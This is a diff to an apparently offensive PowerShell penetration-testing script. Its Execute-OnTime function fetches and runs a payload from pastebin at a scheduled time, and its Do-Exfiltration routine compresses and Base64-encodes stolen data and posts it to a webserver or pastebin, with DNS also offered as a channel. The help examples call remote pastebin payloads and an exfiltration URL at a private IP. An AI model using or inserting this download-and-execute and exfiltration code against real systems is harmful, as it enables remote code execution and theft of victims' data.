@@ -56,7 +56,7 @@ Authoritative Name Server for the domain specified in DomainName
 PS > Execute-OnTime http://example.com/script.ps1 hh:mm http://pastebin.com/raw.php?i=Zhyf8rwh stoppayload
 
 EXAMPLE
-PS > Execute-OnTime http://pastebin.com/raw.php?i=Zhyf8rwh hh:mm http://pastebin.com/raw.php?i=jqP2vJ3x stoppayload -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php>
+PS > Execute-OnTime http://pastebin.com/raw.php?i=Zhyf8rwh hh:mm http://pastebin.com/raw.php?i=jqP2vJ3x stoppayload -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
 
 Use above when using the payload from non-interactive shells.
 
@@ -183,15 +183,16 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
 
     function Compress-Encode
     {
-        #Compression logic from http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
-        $encdata = [string]::Join("`n", $pastevalue)
-        $ms = New-Object System.IO.MemoryStream
-        $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
-        $sw = New-Object System.IO.StreamWriter($cs)
-        $sw.Write($encdata)
-        $sw.Close();
-        $Compressed = [Convert]::ToBase64String($ms.ToArray())
-        $Compressed
+        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
+        $ms = New-Object IO.MemoryStream
+        $action = [IO.Compression.CompressionMode]::Compress
+        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
+        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+        $pastevalue | ForEach-Object {$sw.WriteLine($_)}
+        $sw.Close()
+        # Base64 encode stream
+        $code = [Convert]::ToBase64String($ms.ToArray())
+        return $code
     }
 
     if ($exfiloption -eq "pastebin")
@@ -225,7 +226,6 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
     elseif ($exfiloption -eq "webserver")
     {
         $Data = Compress-Encode    
-        $Data
         post_http $URL $Data
     }
     elseif ($ExfilOption -eq "DNS")
